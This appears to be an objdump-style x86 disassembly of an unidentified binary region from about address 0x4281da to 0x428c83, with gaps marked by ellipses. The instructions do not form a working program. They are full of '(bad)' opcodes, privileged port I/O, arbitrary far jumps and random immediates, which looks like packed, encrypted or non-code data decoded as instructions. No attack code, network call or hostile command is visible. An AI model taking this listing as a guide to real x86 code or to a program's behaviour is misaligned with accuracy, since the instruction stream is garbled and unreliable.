  4281da:	(bad)  
  4281db:	aam    0xca
  4281dd:	push   ds
  4281de:	das    
  4281df:	test   al,0x52
  4281e1:	and    BYTE PTR [ebx+0x4187a10c],al
  4281e7:	sub    al,0x9d
  4281e9:	adc    ch,BYTE PTR [esi-0x5b9d1a38]
  4281ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281f0:	test   al,0xda
  4281f2:	jns    0x4281a9
  4281f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281f5:	xchg   ebp,eax
  4281f6:	cli    
  4281f7:	mov    ebp,0xedb0bec6
  4281fc:	jnp    0x4281e8
  4281fe:	jmp    0x63e9:0xe73589c7
  428205:	jecxz  0x428268
  428207:	je     0x4281f2
  428209:	out    0x63,al
  42820b:	jne    0x428238
  42820d:	mov    bl,0xf0
  42820f:	into   
  428210:	ins    BYTE PTR es:[edi],dx
  428211:	cdq    
  428212:	out    dx,al
  428213:	jo     0x428226
  428215:	fldcw  WORD PTR [edi]
  428217:	nop
  428218:	dec    ecx
  428219:	jns    0x4281bb
  42821b:	cdq    
  42821c:	mov    gs,esp
  42821e:	outs   dx,BYTE PTR ds:[esi]
  42821f:	push   0x664679c6
  428224:	xor    ch,cl
  428226:	mov    esp,0x2f199c8a
  42822b:	mov    edi,esi
  42822d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42822e:	(bad)  [eax]
  428230:	out    0x30,eax
  428232:	loopne 0x428202
  428234:	out    dx,al
  428235:	aad    0xa3
  428237:	ss jle 0x42825b
  42823a:	mov    al,0x8f
  42823c:	popa   
  42823d:	icebp  
  42823e:	scas   al,BYTE PTR es:[edi]
  42823f:	jle    0x428249
  428241:	js     0x428208
  428243:	jmp    0x30e4dfb7
  428248:	nop
  428249:	scas   al,BYTE PTR es:[edi]
  42824a:	or     al,0x1d
  42824c:	cmp    DWORD PTR ds:[ebx+ebp*2],ebx
  428250:	das    
  428251:	mov    ebx,0xf1b8e834
  428256:	mov    eax,ds:0x5e565871
  42825b:	or     eax,0xb406acdc
  428260:	imul   edi,ebx,0xffffffb6
  428263:	out    dx,al
  428264:	dec    ecx
  428265:	push   ds
  428266:	(bad)  
  428268:	(bad)  
  428269:	mov    ch,0x44
  42826b:	aad    0x73
  42826d:	arpl   WORD PTR [esi+0x9db6eed],dx
  428273:	push   esi
  428274:	add    al,0x59
  428276:	dec    edx
  428277:	int3   
  428278:	hlt    
  428279:	sbb    al,0xdd
  42827b:	test   eax,0xe957d889
  428280:	mov    eax,ds:0xf77ede63
  428285:	dec    esp
  428286:	add    eax,0xa2045c44
  42828b:	int3   
  42828c:	out    0x1,al
  42828e:	add    ecx,DWORD PTR [edi+0xd1]
	...
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	push   0x1411fadf
  428305:	scas   al,BYTE PTR es:[edi]
  428306:	add    DWORD PTR [eax],eax
  428308:	add    eax,0x58000001
  42830d:	inc    ebx
  42830e:	xchg   esp,eax
  42830f:	inc    edx
  428310:	and    DWORD PTR [ecx-0x28],eax
  428313:	push   0xffffffeb
  428315:	jmp    0x6471c4a1
  42831a:	and    dh,BYTE PTR ds:0xcb8907f8
  428320:	xor    edi,DWORD PTR [edi]
  428322:	jb     0x428359
  428324:	shl    BYTE PTR [eax-0x1f],1
  428327:	fcomp  QWORD PTR [edi]
  428329:	and    DWORD PTR ss:[eax-0x4c],ebx
  42832d:	xchg   ecx,eax
  42832e:	rcl    DWORD PTR [edi],1
  428330:	pop    ecx
  428331:	jbe    0x428397
  428333:	mov    DWORD PTR [eax-0x121f408],0xaa335ccd
  42833d:	jge    0x4283a0
  42833f:	jg     0x4283b1
  428341:	ss jmp 0x4283a9
  428344:	aad    0x24
  428346:	xchg   esp,eax
  428347:	repz les esp,FWORD PTR [ecx+0x5f1930e8]
  42834e:	(bad)  
  428350:	cmp    BYTE PTR [ebp-0x3b],bh
  428353:	cmp    eax,0x85fea222
  428358:	mov    esi,0x12b4b052
  42835d:	jo     0x4283b9
  42835f:	lods   al,BYTE PTR ds:[esi]
  428360:	fdivp  st(6),st
  428362:	dec    ebx
  428363:	daa    
  428364:	bound  ecx,QWORD PTR [esi-0x6e]
  428367:	adc    dl,BYTE PTR [ecx+eax*2]
  42836a:	xchg   ecx,eax
  42836b:	out    dx,al
  42836c:	cwde   
  42836d:	xlat   BYTE PTR ds:[ebx]
  42836e:	cld    
  42836f:	fwait
  428370:	lods   eax,DWORD PTR ds:[esi]
  428371:	out    dx,al
  428372:	mov    ebp,0x565fb04b
  428377:	out    dx,al
  428378:	(bad)  
  428379:	out    dx,eax
  42837a:	jbe    0x4283c2
  42837c:	imul   esp,ecx,0x5812c242
  428382:	pusha  
  428383:	(bad)  ds:0xc1ce4f03
  428389:	push   esi
  42838a:	int3   
  42838b:	popf   
  42838c:	dec    edx
  42838d:	aad    0xb3
  42838f:	xor    bl,dl
  428391:	adc    edx,DWORD PTR [ebx-0x65]
  428394:	fwait
  428395:	ds dec eax
  428397:	add    eax,0xdaf646ae
  42839c:	(bad)  
  42839d:	icebp  
  42839e:	jns    0x428353
  4283a0:	(bad)  
  4283a1:	sbb    cl,ah
  4283a3:	pop    ebx
  4283a4:	sbb    ecx,DWORD PTR [eax-0x7f13b101]
  4283aa:	dec    ecx
  4283ab:	mov    BYTE PTR [edx],ah
  4283ad:	fist   DWORD PTR [ebx-0x62]
  4283b0:	push   ebp
  4283b1:	inc    ebx
  4283b2:	xchg   ebp,eax
  4283b3:	jbe    0x4283cf
  4283b5:	pop    ds
  4283b6:	xor    al,0x99
  4283b8:	push   0x3ae5a4e7
  4283bd:	jle    0x42842f
  4283bf:	aaa    
  4283c0:	cld    
  4283c1:	fwait
  4283c2:	leave  
  4283c3:	mov    ebp,0xc89820fc
  4283c8:	and    bh,dl
  4283ca:	sbb    dl,BYTE PTR [edi+0x3d]
  4283cd:	sbb    esp,edi
  4283cf:	shl    BYTE PTR [ecx+0x5],0xd9
  4283d3:	popa   
  4283d4:	into   
  4283d5:	xor    ecx,DWORD PTR [edi]
  4283d7:	adc    ch,BYTE PTR [ecx-0x63]
  4283da:	int3   
  4283db:	push   eax
  4283dc:	push   esi
  4283dd:	mov    esp,0x4244ebfd
  4283e2:	mov    fs,WORD PTR [eax-0x62]
  4283e5:	or     BYTE PTR fs:[ebp+0x55],bl
  4283e9:	dec    ecx
  4283ea:	(bad)  
  4283eb:	xor    dl,ah
  4283ed:	sahf   
  4283ee:	rcr    eax,1
  4283f0:	jo     0x42837d
  4283f2:	pop    edi
  4283f3:	loopne 0x428377
  4283f5:	dec    eax
  4283f6:	mov    ds:0xead24259,al
  4283fb:	aaa    
  4283fc:	retf   0x9894
  4283ff:	(bad)  
  428400:	lock mov ds:0x89c4d716,al
  428406:	hlt    
  428407:	mov    ebx,edi
  428409:	sti    
  42840a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42840b:	in     eax,dx
  42840c:	mov    ebp,0xc53f54d2
	...
  428471:	add    BYTE PTR [eax],al
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x5babfb32
  428481:	pop    ds
  428482:	faddp  st(6),st
  428484:	sbb    DWORD PTR [edi+0x1050001],ebp
  42848a:	add    BYTE PTR [eax],al
  42848c:	je     0x428436
  42848e:	sbb    bl,al
  428490:	fsub   QWORD PTR cs:[edx+0x3a358e97]
  428497:	xchg   ebx,eax
  428498:	mov    eax,ds:0x87a089fb
  42849d:	bound  edx,QWORD PTR cs:[ecx+0x63]
  4284a1:	mov    edx,0x68a179d9
  4284a6:	loope  0x428493
  4284a8:	jbe    0x428514
  4284aa:	mov    eax,0x8be6ab30
  4284af:	xchg   edi,eax
  4284b0:	sbb    al,0xbb
  4284b2:	pop    edi
  4284b3:	cmp    esi,DWORD PTR [eax-0x50]
  4284b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4284b7:	retf   0xe1ab
  4284ba:	and    ecx,DWORD PTR [eax-0xe]
  4284bd:	mov    edx,0xc9db090
  4284c2:	push   esp
  4284c3:	mul    BYTE PTR [esi]
  4284c5:	mov    BYTE PTR [esi+0x76230ee6],bl
  4284cb:	jbe    0x4284a7
  4284cd:	adc    al,0x8
  4284cf:	daa    
  4284d0:	mov    BYTE PTR [edx],0xb0
  4284d3:	call   0xd28bb22b
  4284d8:	mov    bl,0x5a
  4284da:	test   al,0x70
  4284dc:	outs   dx,DWORD PTR ds:[esi]
  4284dd:	mov    edi,?
  4284df:	jbe    0x428497
  4284e1:	sti    
  4284e2:	adc    BYTE PTR [esi+0x3c],0xeb
  4284e6:	add    DWORD PTR [edi],ebp
  4284e8:	test   eax,0x9d01b899
  4284ed:	repnz add esp,DWORD PTR [ebx]
  4284f0:	xor    ah,cl
  4284f2:	mov    esi,DWORD PTR [esi-0x31a3a37c]
  4284f8:	or     BYTE PTR [edx+eiz*1-0xe],cl
  4284fc:	out    0x72,al
  4284fe:	push   ebx
  4284ff:	mov    ebp,0x5e8f7e05
  428504:	push   ecx
  428505:	mov    WORD PTR [ecx+0x55baa1f1],cs
  42850b:	sub    DWORD PTR [ebp-0x5c],ebp
  42850e:	aaa    
  42850f:	rcr    bl,1
  428511:	scas   eax,DWORD PTR es:[edi]
  428512:	sbb    bl,al
  428514:	ds call 0xb1f9:0x31ffea2f
  42851c:	int3   
  42851d:	dec    esi
  42851e:	cmp    eax,0x4371203c
  428523:	out    0x32,eax
  428525:	call   0x8e988ab4
  42852a:	sub    al,0x4e
  42852c:	sub    DWORD PTR [esi-0x17],esi
  42852f:	mov    edi,0xa656f281
  428534:	out    0xdc,eax
  428536:	fild   WORD PTR [edx-0x20]
  428539:	push   esp
  42853a:	adc    esp,DWORD PTR [edi+0x3a153058]
  428540:	ss pop ss
  428542:	cld    
  428543:	clc    
  428544:	in     al,0x5a
  428546:	(bad)  
  428547:	(bad)  
  428548:	pushf  
  428549:	push   es
  42854a:	js     0x42856d
  42854c:	push   esp
  42854d:	and    eax,ebx
  42854f:	sbb    ecx,esp
  428551:	outs   dx,DWORD PTR ds:[esi]
  428552:	jmp    0x42851d
  428554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428555:	cmp    BYTE PTR [edi+ebx*2],dh
  428558:	mov    eax,ds:0x4b85f6a9
  42855d:	sub    al,0x88
  42855f:	fwait
  428560:	dec    ecx
  428561:	cmc    
  428562:	je     0x428591
  428564:	inc    esp
  428565:	gs (bad) 
  428567:	hlt    
  428568:	dec    ebx
  428569:	ds das 
  42856b:	test   BYTE PTR fs:[edx],0x92
  42856f:	add    dl,ah
  428571:	test   BYTE PTR [ebp+0x49],cl
  428574:	cmp    dl,dh
  428576:	rep ins DWORD PTR es:[edi],dx
  428578:	mov    cl,0x2c
  42857a:	adc    eax,0x3fd6ffcd
  42857f:	test   DWORD PTR [eax+0x849aa74],edi
  428585:	fwait
  428586:	pusha  
  428587:	or     BYTE PTR [edx+0x68],bh
  42858a:	inc    ebx
  42858b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42858c:	les    eax,FWORD PTR [eax+eiz*2+0x36]
  428590:	sbb    DWORD PTR [eax],eax
	...
  4285f2:	add    BYTE PTR [eax],al
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x363ea3f6
  428602:	xchg   ebx,eax
  428603:	pop    edi
  428604:	push   ds
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0x96000001,al
  42860d:	addr16 xchg ecx,eax
  42860f:	mov    eax,0x2fa0d371
  428614:	pop    es
  428615:	add    ah,BYTE PTR [ebx+eiz*8+0xc]
  428619:	in     al,dx
  42861a:	imul   esi,ebx,0x58ba21b0
  428620:	jno    0x4285bc
  428622:	cli    
  428623:	test   BYTE PTR [edx+ecx*1],cl
  428626:	paddb  mm0,QWORD PTR [edx-0x41]
  42862a:	mov    ebp,DWORD PTR [eax]
  42862c:	(bad)
  42862f:	jbe    0x4285b6
  428631:	in     al,0x15
  428633:	xor    eax,0xcf265842
  428638:	push   ebp
  428639:	pop    eax
  42863a:	lds    ecx,FWORD PTR [ebp+esi*1-0x5ff5873f]
  428641:	inc    esi
  428642:	imul   ah
  428644:	sub    DWORD PTR [esi+ebp*1+0x79],0x1c07022f
  42864c:	jle    0x428664
  42864e:	push   esi
  42864f:	dec    edx
  428650:	out    0xae,eax
  428652:	push   edx
  428653:	jmp    0x4688:0x50d49341
  42865a:	add    al,0x31
  42865c:	daa    
  42865d:	es addr16 cli 
  428660:	cmp    DWORD PTR [eax],esi
  428662:	leave  
  428663:	jge    0x428650
  428665:	ja     0x4286bd
  428667:	dec    ebx
  428668:	xor    eax,0x8a815045
  42866d:	lock fst DWORD PTR [ecx+0x42ee4dba]
  428674:	dec    esi
  428675:	xchg   edx,eax
  428676:	jge    0x4285fc
  428678:	fwait
  428679:	mov    eax,ds:0x58e6b153
  42867e:	ret    
  42867f:	pop    es
  428680:	and    ah,al
  428682:	push   0x108b74d4
  428687:	shl    BYTE PTR [ebp+0x69],1
  42868a:	ss pop esp
  42868c:	nop
  42868d:	gs loopne 0x428665
  428690:	mov    al,ds:0x267bee0e
  428695:	call   0x70ab:0xbd0a4f7d
  42869c:	pop    eax
  42869d:	xchg   ebp,eax
  42869e:	xchg   ebx,eax
  42869f:	inc    eax
  4286a0:	jp     0x4286d3
  4286a2:	sbb    al,0x74
  4286a4:	mov    ah,0xb8
  4286a6:	jnp    0x42865d
  4286a8:	mov    ebp,0x4e2592e1
  4286ad:	push   edi
  4286ae:	pop    edi
  4286af:	inc    esi
  4286b0:	scas   al,BYTE PTR es:[edi]
  4286b1:	mov    esi,0xa05016c3
  4286b6:	mov    ecx,0x51049a46
  4286bb:	or     DWORD PTR [eax+ecx*2],edi
  4286be:	push   cs
  4286bf:	adc    esi,DWORD PTR [edx+ebx*1]
  4286c2:	add    DWORD PTR [edx+0x24],eax
  4286c5:	inc    ecx
  4286c6:	mov    ch,0x26
  4286c8:	shl    DWORD PTR [ebx],1
  4286ca:	mov    ecx,0x34592370
  4286cf:	and    BYTE PTR [edi],dh
  4286d1:	adc    bl,bl
  4286d3:	bound  edx,QWORD PTR [ebx-0x6bea11cf]
  4286d9:	or     BYTE PTR [edi],0xbb
  4286dc:	mov    WORD PTR [eax],gs
  4286de:	imul   edx,DWORD PTR [ecx],0x7b
  4286e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4286e2:	jns    0x4286ce
  4286e4:	pop    es
  4286e5:	mov    al,ds:0x5b51bb8c
  4286ea:	shl    BYTE PTR [ebp+0x32d5e4d6],1
  4286f0:	push   edi
  4286f1:	mov    eax,0xbdac0a1e
  4286f6:	cmp    BYTE PTR [edi-0x7d8adbe8],bl
  4286fc:	xor    BYTE PTR ds:0x177cd229,0xfc
  428703:	pop    ecx
  428704:	inc    esi
  428705:	ja     0x428742
  428707:	(bad)  
  428708:	aad    0x2e
  42870a:	jl     0x428691
  42870c:	or     eax,DWORD PTR [edx+edi*8+0x14ae]
	...
  428773:	add    BYTE PTR [esi+0x5b],dl
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x833e0796
  428783:	and    esi,DWORD PTR gs:[ecx+0x1050001]
  42878a:	add    BYTE PTR [eax],al
  42878c:	inc    ecx
  42878d:	repz mov bh,BYTE PTR [ebx-0x71ae54e6]
  428794:	fdivr  QWORD PTR [ebp+0x3e1699d7]
  42879a:	cld    
  42879b:	jae    0x42875e
  42879d:	loopne 0x4287ec
  42879f:	and    eax,0x1dad3acc
  4287a4:	jp     0x4287c5
  4287a6:	data16 sub dh,BYTE PTR [eax+0x2d70dfe8]
  4287ad:	dec    esp
  4287ae:	jb     0x428731
  4287b0:	nop
  4287b1:	addr16 retfw 
  4287b4:	jae    0x4287f3
  4287b6:	les    eax,FWORD PTR [ecx+0x758e3148]
  4287bc:	add    DWORD PTR [ecx+0x27],ecx
  4287bf:	adc    DWORD PTR [esi+0x72069eed],0xfae3516f
  4287c9:	fisub  DWORD PTR [ebx+esi*2+0x486f6676]
  4287d0:	lods   eax,DWORD PTR ds:[esi]
  4287d1:	repnz push esi
  4287d3:	dec    ecx
  4287d4:	out    0xb3,eax
  4287d6:	pop    ecx
  4287d7:	(bad)  
  4287d8:	mov    ah,0x1e
  4287da:	jge    0x4287d1
  4287dc:	imul   edi,DWORD PTR [edx-0x76],0x55
  4287e0:	mov    esi,0xe09439ac
  4287e5:	cld    
  4287e6:	js     0x4287da
  4287e8:	call   0x194a:0x9b643a40
  4287ef:	ds inc edx
  4287f1:	stos   DWORD PTR es:[edi],eax
  4287f2:	push   ss
  4287f3:	adc    al,0x65
  4287f5:	int3   
  4287f6:	mov    ecx,esp
  4287f8:	std    
  4287f9:	push   edi
  4287fa:	xor    eax,0x5c24a6f4
  4287ff:	push   eax
  428800:	xor    BYTE PTR [edx-0x49],bh
  428803:	popf   
  428804:	cdq    
  428805:	ss fld1 
  428808:	push   ss
  428809:	mov    ch,0xc5
  42880b:	and    dl,BYTE PTR [edi+0x7d4b3d7]
  428811:	sub    al,al
  428813:	inc    ecx
  428814:	push   esi
  428815:	mov    bl,dl
  428817:	push   ss
  428818:	ds jle 0x428847
  42881b:	leave  
  42881c:	jg     0x428893
  42881e:	jecxz  0x4287a4
  428820:	std    
  428821:	sub    eax,0xf46e076
  428826:	or     DWORD PTR [ebx-0x73929cab],esi
  42882c:	xchg   ah,dh
  42882e:	inc    esi
  42882f:	paddw  mm5,mm2
  428832:	addr16 aas 
  428834:	fld    DWORD PTR [ebx+ecx*4+0x11]
  428838:	ret    0x4725
  42883b:	mov    edi,0xaa29c93b
  428840:	sbb    BYTE PTR [eax],dl
  428842:	xlat   BYTE PTR ds:[ebx]
  428843:	pop    ebx
  428844:	fdecstp 
  428846:	lock mov ds:0x9a781b97,eax
  42884c:	jne    0x428853
  42884e:	loopne 0x4288c4
  428850:	mov    esp,0x79bd747d
  428855:	mov    dl,0xf2
  428857:	loop   0x4288d0
  428859:	dec    edx
  42885a:	pop    eax
  42885b:	mov    eax,esp
  42885d:	jge    0x4287e0
  42885f:	loopne 0x42886a
  428861:	inc    DWORD PTR [edi-0x12390d4d]
  428867:	push   ebp
  428868:	sahf   
  428869:	dec    edx
  42886a:	xchg   esi,eax
  42886b:	sub    BYTE PTR [eax],dl
  42886d:	in     al,dx
  42886e:	scas   al,BYTE PTR es:[edi]
  42886f:	mov    dl,0x1f
  428871:	cdq    
  428872:	cmove  edx,DWORD PTR [ebx-0x32]
  428876:	loop   0x42886f
  428878:	push   ss
  428879:	sbb    eax,0xfeaf4c0a
  42887e:	dec    ebx
  42887f:	fild   QWORD PTR ds:0x3c776233
  428885:	mov    edi,ebx
  428887:	adc    al,0xf8
  428889:	mov    ebx,0x2bd42ed0
  42888e:	inc    ecx
  42888f:	iret   
  428890:	jno    0x428892
	...
  4288f2:	add    BYTE PTR [eax],al
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0x5f9d0f],bx
  428902:	adc    al,BYTE PTR [eax+ebp*1]
  428905:	mov    dl,0x1
  428907:	add    BYTE PTR ds:0xe5000001,al
  42890d:	push   edi
  42890e:	fisubr WORD PTR [eax-0x35]
  428911:	bound  eax,QWORD PTR [ecx+0x57]
  428914:	sub    eax,DWORD PTR gs:[ebp-0x6b]
  428918:	and    al,ch
  42891a:	jg     0x4288c7
  42891c:	std    
  42891d:	add    eax,0x2838cf51
  428922:	nop
  428923:	lahf   
  428924:	cmp    BYTE PTR es:[ecx+edx*2+0x6d65304b],al
  42892c:	mov    ebx,0xd37e9327
  428931:	push   edi
  428932:	push   esp
  428933:	loope  0x4288b8
  428935:	in     eax,dx
  428936:	and    bh,al
  428938:	iret   
  428939:	sub    eax,0x21141ee5
  42893e:	jne    0x428988
  428940:	fdiv   st(7),st
  428942:	das    
  428943:	out    0xb4,eax
  428945:	xchg   ebp,eax
  428946:	outs   dx,DWORD PTR ds:[esi]
  428947:	fcom   QWORD PTR [edi]
  428949:	data16 jmp 0x4288de
  42894c:	inc    ecx
  42894d:	mov    ebp,edx
  42894f:	push   esi
  428950:	mov    ebx,0x3d838955
  428955:	jecxz  0x4288ea
  428957:	iret   
  428958:	mov    ch,0x4a
  42895a:	sbb    BYTE PTR [ebx],0x46
  42895d:	sbb    dl,BYTE PTR [esi-0x1d54bd29]
  428963:	popf   
  428964:	fnsave [ebx-0x5d]
  428967:	imul   ecx,edx,0xb5b6d2a6
  42896d:	xchg   ebp,eax
  42896e:	iret   
  42896f:	jnp    0x42895f
  428971:	jne    0x428940
  428973:	pop    esi
  428974:	xor    eax,0x3bbdf07
  428979:	sbb    ah,BYTE PTR [edi]
  42897b:	and    BYTE PTR [esi-0x60],bh
  42897e:	sub    al,bh
  428980:	inc    edx
  428981:	fsub   DWORD PTR [edi]
  428983:	in     al,dx
  428984:	and    BYTE PTR [eax],0x1e
  428987:	fistp  QWORD PTR [edx+0x66]
  42898a:	cmp    BYTE PTR [eax+0x26],bh
  42898d:	nop
  42898e:	mov    ecx,0x283b342
  428993:	jne    0x42899e
  428995:	dec    edx
  428996:	dec    eax
  428997:	jp     0x42894b
  428999:	int3   
  42899a:	or     eax,0xdbc5e947
  42899f:	and    eax,0x9f6e546b
  4289a4:	push   ebx
  4289a5:	(bad)  
  4289a6:	leave  
  4289a7:	sbb    ah,BYTE PTR [eax]
  4289a9:	jle    0x4289bf
  4289ab:	xor    dl,0x16
  4289ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289af:	test   BYTE PTR [ebx],0x98
  4289b2:	xchg   dh,bl
  4289b4:	mov    ah,0x34
  4289b6:	in     eax,dx
  4289b7:	cwde   
  4289b8:	sar    BYTE PTR [edi],cl
  4289ba:	jle    0x428a03
  4289bc:	mov    eax,DWORD PTR [eax+esi*1+0x4e]
  4289c0:	cs pop eax
  4289c2:	and    dh,ah
  4289c4:	xchg   ecx,eax
  4289c5:	adc    DWORD PTR [ebx-0x51],esi
  4289c8:	enter  0x4f79,0x49
  4289cc:	cmp    al,0x13
  4289ce:	mov    bh,0xa6
  4289d0:	xor    eax,0xda8701a
  4289d5:	push   ebp
  4289d6:	enter  0xaae5,0x4d
  4289da:	xchg   ecx,eax
  4289db:	inc    esi
  4289dc:	shl    BYTE PTR [ebx+edi*8],1
  4289df:	loopne 0x4289a9
  4289e1:	imul   BYTE PTR [ecx+0x26434a4e]
  4289e7:	hlt    
  4289e8:	xor    bl,BYTE PTR [esi+esi*8+0x76]
  4289ec:	mov    BYTE PTR [ebp+ebp*2-0x70],ch
  4289f0:	fldenv [ecx+edx*1+0x25]
  4289f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289f5:	xor    ch,BYTE PTR [eax-0x5b]
  4289f8:	xchg   esi,eax
  4289f9:	cld    
  4289fa:	mov    esp,0x97550af1
  4289ff:	sbb    DWORD PTR ds:0x565312f2,0x6d
  428a06:	into   
  428a07:	mov    al,0xa1
  428a09:	xlat   BYTE PTR ds:[ebx]
  428a0a:	mov    eax,ds:0x49c8a981
  428a0f:	mov    dl,BYTE PTR [eax+eax*1+0x0]
	...
  428a72:	add    BYTE PTR [eax],al
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x24c90eed]
  428a83:	adc    al,0x2d
  428a85:	mov    bl,0x1
  428a87:	add    BYTE PTR ds:0x4d000001,al
  428a8d:	in     eax,dx
  428a8e:	cmp    ebp,0xfffffff3
  428a91:	xor    eax,0xc1f8db80
  428a96:	out    dx,eax
  428a97:	push   ebp
  428a98:	jo     0x428ab2
  428a9a:	mov    eax,ds:0x630a890d
  428a9f:	mov    ch,BYTE PTR ds:0x87e0f787
  428aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428aa6:	imul   edx,DWORD PTR [edx+0x57fb5e94],0xae92db5c
  428ab0:	cmp    al,0x1f
  428ab2:	inc    edx
  428ab3:	pop    ebp
  428ab4:	not    BYTE PTR [eax+esi*1-0x1eb63232]
  428abb:	xor    ecx,ecx
  428abd:	add    eax,0xad7dd97f
  428ac2:	cmp    dl,dh
  428ac4:	loopne 0x428a9c
  428ac6:	mov    DWORD PTR [eax+0x5a],esi
  428ac9:	jmp    0x428ab5
  428acb:	mov    ds:0x7570351a,al
  428ad0:	call   0xf3050c83
  428ad5:	sti    
  428ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ad7:	pop    ecx
  428ad8:	rcl    DWORD PTR [edx],1
  428ada:	arpl   WORD PTR [eax+0x2ed4503f],cx
  428ae0:	sbb    DWORD PTR [eax-0x42],esp
  428ae3:	mov    edx,0xfe8d0e38
  428ae8:	xor    BYTE PTR [edx],bl
  428aea:	xor    ch,al
  428aec:	daa    
  428aed:	dec    esp
  428aee:	mov    al,ds:0xe79b6969
  428af3:	add    al,0x2b
  428af5:	mov    ds:0x534a5ecf,al
  428afa:	push   cs
  428afb:	cs out 0x33,eax
  428afe:	test   eax,0x3d47c902
  428b03:	xor    edx,DWORD PTR [ebp+0xb]
  428b06:	pop    bx
  428b08:	sahf   
  428b09:	jmp    0x428aa9
  428b0b:	adc    al,0x88
  428b0d:	loope  0x428add
  428b0f:	inc    ecx
  428b10:	scas   ax,WORD PTR es:[edi]
  428b12:	sub    al,0xb5
  428b14:	outs   dx,BYTE PTR ds:[esi]
  428b15:	je     0x428ac1
  428b17:	pop    es
  428b18:	mov    ds:0xe34ccc15,eax
  428b1d:	repz sbb al,0x28
  428b20:	pushf  
  428b21:	pushf  
  428b22:	adc    DWORD PTR [esi],esi
  428b24:	mov    cl,0xc4
  428b26:	rcl    BYTE PTR [ebp+0x7],cl
  428b29:	ret    
  428b2a:	jmp    0x22a89466
  428b2f:	xchg   edx,eax
  428b30:	mov    eax,DWORD PTR ds:0xf8d9c46b
  428b36:	in     eax,0xd2
  428b38:	test   BYTE PTR [ecx],ch
  428b3a:	adc    BYTE PTR [esi+0x28e7f2d1],bl
  428b40:	mov    ch,0xe9
  428b42:	mov    ds:0x2be1867d,eax
  428b47:	sub    al,0x5a
  428b49:	dec    cl
  428b4b:	cld    
  428b4c:	dec    ebx
  428b4d:	add    dh,BYTE PTR [esi-0xfe5ccac]
  428b53:	or     ebp,DWORD PTR [ebp+edi*2-0x36481560]
  428b5a:	mov    ds:0x547a6cad,al
  428b5f:	(bad)  
  428b60:	push   ecx
  428b61:	int    0xe0
  428b63:	push   ecx
  428b64:	xor    BYTE PTR [ebp+0x1e081e6c],0x6f
  428b6b:	dec    esi
  428b6c:	leave  
  428b6d:	mov    cl,0x12
  428b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b70:	repz pop ds
  428b72:	or     BYTE PTR [ebp+0x1fbb6156],bh
  428b78:	rcr    bh,cl
  428b7a:	arpl   WORD PTR [esi],dx
  428b7c:	stos   DWORD PTR es:[edi],eax
  428b7d:	mov    eax,0x9e2af24b
  428b82:	jg     0x428b7e
  428b84:	or     ebp,DWORD PTR [ecx+ebx*2+0x14]
  428b88:	je     0x428b42
  428b8a:	arpl   WORD PTR [ebx+0x1b],cx
  428b8d:	shl    BYTE PTR [ebx+0x1385],1
	...
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0xb7bf8c3d
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [ebx+edx*2-0x6f7a2d35],cl
  428c12:	ss dec edx
  428c14:	push   0xb5868b6a
  428c19:	aad    0x5f
  428c1b:	(bad)  [ebx+0xc]
  428c1e:	mov    ebp,0x3adab20a
  428c23:	push   0x6f
  428c25:	jle    0x428c97
  428c27:	call   0xb2e9:0x79a4bd12
  428c2e:	outs   dx,DWORD PTR ds:[esi]
  428c2f:	je     0x428be0
  428c31:	in     eax,dx
  428c32:	icebp  
  428c33:	(bad)  
  428c34:	jg     0x428c2a
  428c36:	pop    ecx
  428c37:	loope  0x428bde
  428c39:	inc    esi
  428c3a:	repz fdivr st(1),st
  428c3d:	es add eax,0xd4313161
  428c43:	int3   
  428c44:	mov    ebx,0x1753b3e0
  428c49:	xchg   BYTE PTR [ebx],bl
  428c4b:	pop    ecx
  428c4c:	sub    BYTE PTR [edi+eax*8+0x7ac2e3ab],bh
  428c53:	fucom  st(0)
  428c55:	mov    bl,0xee
  428c57:	add    BYTE PTR [ebx],dl
  428c59:	add    cl,al
  428c5b:	or     BYTE PTR [ebp+0xd],dh
  428c5e:	xchg   edx,eax
  428c5f:	adc    al,0x11
  428c61:	(bad)  
  428c62:	icebp  
  428c63:	cs loopne 0x428cbe
  428c66:	pop    ds
  428c67:	ins    BYTE PTR es:[edi],dx
  428c68:	cmp    eax,0x9cacd524
  428c6d:	lock ror BYTE PTR [edx+0x1c],1
  428c71:	dec    edi
  428c72:	fdivr  DWORD PTR [esi-0x75b53e3c]
  428c78:	rcl    cl,0xe7
  428c7b:	ss sub al,0x9a
  428c7e:	fld    TBYTE PTR [edx]
  428c80:	dec    esp
  428c81:	pop    edi
  428c82:	aas    
  428c83:	push   ecx
